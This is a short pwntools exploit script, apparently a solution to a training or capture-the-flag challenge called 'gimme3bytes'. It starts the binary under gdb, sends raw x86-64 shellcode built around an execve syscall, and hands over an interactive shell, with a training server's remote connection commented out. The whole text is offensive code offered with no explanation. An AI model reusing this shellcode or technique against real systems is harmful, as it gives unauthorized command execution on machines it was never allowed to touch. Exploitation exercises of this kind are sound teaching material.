from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

#ssh = ssh("acidburn", "10.0.2.15:22")
r = process("./gimme3bytes")
#r = remote("training.jinblack.it", 2004)

gdb.attach(r , """b main
	""")

print(r.recv())

shellcode = b"\x6A\x3B\x90" + b"\x58\x48\x31\xFF\x48\x31\xD2\x48\xBE\x14\x60\x58\x98\x2F\x7F\x00\x00\x0F\x05"

r.send(shellcode)

r.interactive()